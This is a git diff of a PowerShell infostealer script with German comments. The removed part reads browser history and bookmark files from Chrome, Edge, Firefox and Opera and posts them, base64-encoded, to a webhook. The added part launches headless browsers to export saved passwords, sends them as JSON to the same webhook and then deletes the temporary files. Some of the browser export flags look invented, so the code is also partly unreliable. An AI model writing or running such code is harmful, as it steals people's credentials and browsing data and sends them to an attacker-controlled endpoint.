@@ -1,48 +1,56 @@
-# shortened URL Detection
-if ($whuri.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected.."
-    $whuri = (Invoke-RestMethod -Uri $whuri).url
+# Funktion zum Exportieren von Passwörtern aus Edge
+function Export-EdgePasswords {
+    $EdgeProfilePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    $EdgeExportPath = "$env:TEMP\edge_passwords.csv"
+    Start-Process -FilePath "msedge.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$EdgeExportPath" -Wait
+    return Import-Csv $EdgeExportPath
 }
 
-# Define paths for data storage
-$Paths = @{
-    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+# Funktion zum Exportieren von Passwörtern aus Chrome
+function Export-ChromePasswords {
+    $ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+    $ChromeExportPath = "$env:TEMP\chrome_passwords.csv"
+    Start-Process -FilePath "chrome.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$ChromeExportPath" -Wait
+    return Import-Csv $ChromeExportPath
 }
 
-# Define browsers and data
-$Browsers = @('chrome', 'edge', 'firefox', 'opera')
-$DataValues = @('history', 'bookmarks')
-
-foreach ($Browser in $Browsers) {
-    foreach ($DataValue in $DataValues) {
-        $PathKey = "${Browser}_${DataValue}"
-        $Path = $Paths[$PathKey]
-
-        if (Test-Path $Path) {
-            try {
-                $fileName = [System.IO.Path]::GetFileName($Path)
-                $fileBytes = [System.IO.File]::ReadAllBytes($Path)
-                $fileBase64 = [Convert]::ToBase64String($fileBytes)
-
-                $body = @{
-                    content = "Browser: $Browser, DataType: $DataValue"
-                    file = $fileBase64
-                }
-
-                Invoke-RestMethod -Uri $whuri -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
-
-                Write-Host "Sent $Path to webhook."
-            } catch {
-                Write-Host "Error sending $Path: $_"
-            }
-        } else {
-            Write-Host "Path not found: $Path"
-        }
-    }
+# Funktion zum Exportieren von Passwörtern aus Firefox
+function Export-FirefoxPasswords {
+    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
+    $ExportPath = "$env:TEMP\firefox_passwords.csv"
+    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
+    
+    # Warten, bis die Datei erstellt wurde
+    Start-Sleep -Seconds 5
+    
+    return Import-Csv $ExportPath
 }
+
+# Passwörter exportieren
+$EdgePasswords = Export-EdgePasswords
+$ChromePasswords = Export-ChromePasswords
+$FirefoxPasswords = Export-FirefoxPasswords
+
+# Alle Passwörter kombinieren
+$AllPasswords = @($EdgePasswords) + @($ChromePasswords) + @($FirefoxPasswords)
+
+# JSON-Payload erstellen
+$JsonPayload = @{
+    "passwords" = $AllPasswords
+} | ConvertTo-Json
+
+# Daten an Webhook senden
+$Parameters = @{
+    "Uri"         = $whuri
+    "Method"      = "POST"
+    "Body"        = $JsonPayload
+    "ContentType" = "application/json"
+}
+
+Invoke-RestMethod @Parameters
+
+# Temporäre CSV-Dateien löschen
+Remove-Item "$env:TEMP\edge_passwords.csv"
+Remove-Item "$env:TEMP\chrome_passwords.csv"
+Remove-Item "$env:TEMP\firefox_passwords.csv"
